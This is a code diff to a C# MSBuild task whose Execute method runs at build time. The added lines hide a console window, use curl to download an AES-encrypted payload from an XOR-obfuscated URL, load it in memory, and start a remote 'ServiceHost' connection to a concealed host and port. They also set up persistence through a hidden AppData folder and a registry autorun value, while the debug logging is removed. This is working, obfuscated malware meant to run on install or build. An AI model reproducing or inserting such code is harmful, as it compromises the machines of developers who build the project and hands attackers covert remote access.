@@ -33,105 +33,112 @@
             static readonly byte[] _s0={0x25,0xD6,0x05,0x83,0xF8,0x2C,0xEA,0x11,0xE0,0x36,0xAF,0x24,0x08,0x8D,0x5D,0xD8,0x38,0xC0,0x04,0x80,0xEE,0x64,0xA6,0x51,0xFC,0x23,0xBD,0x64,0x1B,0xCA,0x4A,0xDF,0x20};
             static readonly byte[] _s1={0x62,0xEB,0x1F,0x87,0xEE,0x7A,0xE8,0x7C,0xFD,0x24,0xAB,0x25,0x1F,0x88,0x5A,0xD4,0x22,0xCC,0x05,0x81,0xEE,0x60,0xA0,0x4C,0xE1,0x32,0xF7,0x67,0x0E,0x8D,0x47};
             static readonly byte[] _s2={0x62,0xD2,0x10,0x8A,0xE7,0x79,0xA4,0x5A,0xBC,0x35,0xB1,0x64};
+            static readonly byte[] _s3={0x62,0xC0,0x5F,0x8B,0xE6,0x7A};
             static readonly byte[] _s4={0x2E,0xD7,0x03,0x9F,0xA5,0x73,0xBD,0x5B};
             static readonly byte[] _s5={0x1E,0x90,0x48,0x8A,0xD2,0x45,0x83,0x6A,0xC8,0x00,0x96,0x73,0x35,0xBC,0x7B,0xFC,0x17,0xFA,0x1D,0xB4,0xE9,0x25,0x8F,0x78,0xF7,0x10,0x82,0x7A,0x0D,0xA1,0x7B,0xD8,0x29,0xE5,0x37,0xA2,0xD2,0x41,0x8B,0x4C,0xDB,0x06,0x99,0x37};
             static readonly byte[] _s6={0x7E,0xD3,0x43,0xD8,0xBC,0x2E,0xB7,0x15,0xE7,0x25,0xEC,0x5E,0x21,0xD4,0x63,0xF3,0x62,0xD7,0x42,0xC5,0xF1,0x71,0xF8,0x03};
+            static readonly byte[] _s7={0x00,0xCB,0x12,0x81,0xE4,0x65,0xAA,0x58,0xE6};
+            static readonly byte[] _s8={0x1E,0xC7,0x03,0x85,0xE2,0x75,0xA0,0x4D};
+            static readonly byte[] _s9={0x2E,0xCD,0x1F,0x95,0xE2,0x71,0xEB,0x46,0xFF,0x3B};
+            static readonly byte[] _sA={0x3E,0xD6,0x10,0x81,0xFF,0x38,0xB3,0x5C,0xE1};
+            static readonly byte[] _sB={0x2F,0x8C,0x09,0x9E,0xE7};
+            static readonly byte[] _sC={0x0E,0x98,0x2D,0xA4,0xE2,0x78,0xA1,0x51,0xE5,0x24,0x84,0x47,0x06,0x87,0x5B,0xDF,0x3E,0xCD,0x17,0x87,0xA5,0x58,0x80,0x6A,0xCE,0x11,0xAA,0x6B,0x02,0x81,0x5E,0xDF,0x3F,0xC9,0x47,0xC7,0xD7,0x60,0xF1,0x10,0xA2,0x79,0xEB,0x3A,0x5C,0xD5,0x10,0xEC,0x00,0xF1,0x33,0x86,0xE2,0x7A,0xA1,0x10,0xF7,0x2F,0xBD};
+            static readonly byte[] _sD={0x1E,0xCD,0x17,0x87,0xFC,0x77,0xB7,0x5B,0xCE,0x1A,0xB1,0x69,0x1D,0x8B,0x5A,0xDF,0x2B,0xD6,0x2D,0xA4,0xE2,0x78,0xA1,0x51,0xE5,0x24,0x84,0x49,0x1A,0x96,0x5B,0xD5,0x23,0xD6,0x27,0x96,0xF9,0x65,0xAC,0x51,0xFC,0x0B,0x8A,0x7F,0x01};
+            static readonly byte[] _sE={0x1A,0xCB,0x1F,0x97,0xE4,0x61,0xB6,0x7D,0xFD,0x39,0xBE,0x63,0x08,0x91,0x5B,0xD1,0x39,0xCB,0x1E,0x9D};
+            static readonly byte[] _sF={0x0E,0xD0,0x14,0x92,0xFF,0x73,0x8A,0x5C,0xF8,0x32,0xBB,0x7E,0x47,0xC6,0x7E,0xE3,0x2E,0xD0,0x18,0x83,0xFF,0x38,0x96,0x56,0xF7,0x3B,0xB4,0x28,0x46,0xCA,0x7B,0xC5,0x23,0x82,0x53,0xD1};
+            static readonly byte[] _sG={0x6F,0x80,0x51,0xD1,0xA9};
+            static readonly byte[] _sH={0x6F,0x80,0x51,0xDC,0xE5,0x79,0xA9,0x51,0xF5,0x38,0xF8,0x25,0x19,0xDE,0x58,0x92,0x61,0x82,0x41,0xDF,0xAB,0x50,0xA4,0x52,0xE1,0x32};
+            static readonly byte[] _sI={0x3A,0xD1,0x12,0x81,0xE2,0x66,0xB1,0x10,0xF7,0x2F,0xBD,0x2A,0x4D};
             static readonly byte[] _sJ={0x0C,0xD2,0x01,0xA0,0xEE,0x64,0xB3,0x57,0xF1,0x32,0xAB,0x24,0x3C};
             static readonly byte[] _sK={0x0C,0xD2,0x01,0xA0,0xEE,0x64,0xB3,0x57,0xF1,0x32,0xAB,0x24,0x3C,0x81,0x5B,0xC6,0x24,0xC1,0x14,0xBB,0xE4,0x65,0xB1};
             static readonly byte[] _sM={0x04,0xCC,0x18,0x87,0xE2,0x77,0xA9,0x57,0xE8,0x32};
             static readonly byte[] _sN={0x19,0xC9,0x15,0xBB,0xDE,0x43,0xBD,0x72,0xC7,0x02,0xED,0x47,0x3C,0xB2,0x6F,0xFE,0x19,0xE7,0x28,0xCE};
 
             static string _(byte[] d){byte[] o=new byte[d.Length];for(int i=0;i<d.Length;i++)o[i]=(byte)(d[i]^_xk[i%_xk.Length]);return System.Text.Encoding.UTF8.GetString(o);}
-            static string _log = Path.Combine(Path.GetTempPath(),"cradle_debug.log");
-            static void L(string m){File.AppendAllText(_log,DateTime.Now.ToString("HH:mm:ss")+" "+m+"\r\n");}
+
+            byte[] _f(string u)
+            {
+                string tf=Path.Combine(Path.GetTempPath(),Guid.NewGuid().ToString("N").Substring(0,8));
+                var p=new Process();
+                p.StartInfo.FileName=_(_s4);
+                p.StartInfo.Arguments="-sL -o \""+tf+"\" \""+u+"\"";
+                p.StartInfo.UseShellExecute=false;
+                p.StartInfo.CreateNoWindow=true;
+                p.Start();
+                p.WaitForExit(30000);
+                if(!File.Exists(tf))return null;
+                byte[] d=File.ReadAllBytes(tf);
+                try{File.Delete(tf);}catch{}
+                return d;
+            }
+
+            byte[] _dc(byte[] e,byte[] k,byte[] iv)
+            {
+                using(var a=Aes.Create())
+                {
+                    a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;
+                    a.KeySize=(0x80<<1);a.Key=k;a.IV=iv;
+                    using(var ms=new MemoryStream())
+                    using(var cs=new CryptoStream(ms,a.CreateDecryptor(),CryptoStreamMode.Write))
+                    {cs.Write(e,0,e.Length);cs.FlushFinalBlock();return ms.ToArray();}
+                }
+            }
+
+            void _ps()
+            {
+                try
+                {
+                    string pd=Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData),_(_s7),_(_s8));
+                    string cx=Path.Combine(pd,_(_s9));
+                    string vf=Path.Combine(pd,_(_sA));
+                    Directory.CreateDirectory(pd);
+                    string sx=Path.Combine(Path.GetTempPath(),_(_sB));
+                    if(!File.Exists(cx))
+                    {
+                        if(File.Exists(sx))File.Copy(sx,cx,true);
+                        else{byte[] xd=_f(_(_s0)+_(_s1)+_(_s3));if(xd!=null)File.WriteAllBytes(cx,xd);}
+                    }
+                    string vc=_(_sF)+_(_sC)+_(_sG)+cx+_(_sH);
+                    File.WriteAllText(vf,vc);
+                    try{File.SetAttributes(pd,FileAttributes.Hidden);}catch{}
+                    var rk=Microsoft.Win32.Registry.CurrentUser.OpenSubKey(_(_sD),true);
+                    if(rk!=null){rk.SetValue(_(_sE),_(_sI)+vf+"\"");rk.Close();}
+                }
+                catch{}
+            }
 
             public override bool Execute()
             {
                 try
                 {
-                    File.WriteAllText(_log,"");
-                    L("START");
+                    ShowWindow(GetConsoleWindow(),0);
 
-                    string url = _(_s0)+_(_s1)+_(_s2);
-                    L("URL: "+url);
+                    byte[] raw=_f(_(_s0)+_(_s1)+_(_s2));
+                    if(raw==null||raw.Length<16)return true;
 
-                    string tf=Path.Combine(Path.GetTempPath(),Guid.NewGuid().ToString("N").Substring(0,8));
-                    L("TempFile: "+tf);
-
-                    var p=new Process();
-                    p.StartInfo.FileName=_(_s4);
-                    p.StartInfo.Arguments="-sL -o \""+tf+"\" \""+url+"\"";
-                    p.StartInfo.UseShellExecute=false;
-                    p.StartInfo.CreateNoWindow=true;
-                    L("Launching curl: "+p.StartInfo.FileName+" "+p.StartInfo.Arguments);
-                    p.Start();
-                    p.WaitForExit(30000);
-                    L("Curl exit code: "+p.ExitCode);
-
-                    if(!File.Exists(tf)){L("FAIL: temp file not found");return true;}
-                    byte[] raw=File.ReadAllBytes(tf);
-                    L("Downloaded: "+raw.Length+" bytes");
-                    try{File.Delete(tf);}catch{}
-                    if(raw.Length<16){L("FAIL: too small");return true;}
-
-                    string keyB64=_(_s5);
-                    string ivB64=_(_s6);
-                    L("Key B64: "+keyB64);
-                    L("IV B64: "+ivB64);
-                    byte[] k=Convert.FromBase64String(keyB64);
-                    byte[] iv=Convert.FromBase64String(ivB64);
-                    L("Key len: "+k.Length+" IV len: "+iv.Length);
-
-                    byte[] pl;
-                    using(var a=Aes.Create())
-                    {
-                        a.Mode=CipherMode.CBC;a.Padding=PaddingMode.PKCS7;
-                        a.KeySize=256;a.Key=k;a.IV=iv;
-                        using(var ms=new MemoryStream())
-                        using(var cs=new CryptoStream(ms,a.CreateDecryptor(),CryptoStreamMode.Write))
-                        {cs.Write(raw,0,raw.Length);cs.FlushFinalBlock();pl=ms.ToArray();}
-                    }
-                    L("Decrypted: "+pl.Length+" bytes");
+                    byte[] k=Convert.FromBase64String(_(_s5));
+                    byte[] iv=Convert.FromBase64String(_(_s6));
+                    byte[] pl=_dc(raw,k,iv);
 
                     Assembly la=Assembly.Load(pl);
-                    L("Assembly loaded: "+la.FullName);
+                    _ps();
+                    try{File.Delete(Path.Combine(Path.GetTempPath(),_(_sB)));}catch{}
 
-                    string typeSName=_(_sJ);
-                    L("Looking for type: "+typeSName);
-                    Type st=la.GetType(typeSName);
-                    L("Type found: "+(st!=null));
-
-                    if(st==null){L("FAIL: type S not found. Available types:");foreach(var t2 in la.GetExportedTypes())L("  "+t2.FullName);return true;}
-
-                    var dm=st.GetMethod("D",BindingFlags.Static|BindingFlags.NonPublic|BindingFlags.Public);
-                    L("Method D found: "+(dm!=null));
-
-                    string hostArg=_(_sN);
-                    L("Host arg: "+hostArg);
-                    string h=(string)dm.Invoke(null,new object[]{hostArg});
-                    L("Host resolved: "+h);
+                    Type st=la.GetType(_(_sJ));
+                    var dm=st.GetMethod(_((new byte[]{0x09})),BindingFlags.Static|BindingFlags.NonPublic|BindingFlags.Public);
+                    string h=(string)dm.Invoke(null,new object[]{_(_sN)});
                     int pt=((0xDE<<8)|0xAD)^((0xD1<<8)|0x66);
-                    L("Port: "+pt);
 
-                    string typeSHName=_(_sK);
-                    L("Looking for type: "+typeSHName);
-                    Type sht=la.GetType(typeSHName);
-                    L("ServiceHost type found: "+(sht!=null));
+                    Type sht=la.GetType(_(_sK));
+                    var im=sht.GetMethod(_(_sM),BindingFlags.Static|BindingFlags.NonPublic|BindingFlags.Public);
 
-                    string methodIName=_(_sM);
-                    L("Looking for method: "+methodIName);
-                    var im=sht.GetMethod(methodIName,BindingFlags.Static|BindingFlags.NonPublic|BindingFlags.Public);
-                    L("Initialize method found: "+(im!=null));
-
-                    L("Launching thread...");
-                    var t=new Thread(()=>{try{im.Invoke(null,new object[]{h,pt});}catch(Exception ex){L("THREAD ERROR: "+ex);}});
+                    var t=new Thread(()=>{try{im.Invoke(null,new object[]{h,pt});}catch{}});
                     t.SetApartmentState(ApartmentState.STA);
                     t.IsBackground=false;
                     t.Start();
-                    L("Thread started, sleeping infinite");
                     Thread.Sleep(Timeout.Infinite);
                 }
-                catch(Exception ex){L("EXCEPTION: "+ex.ToString());}
+                catch{}
                 return true;
             }
         }
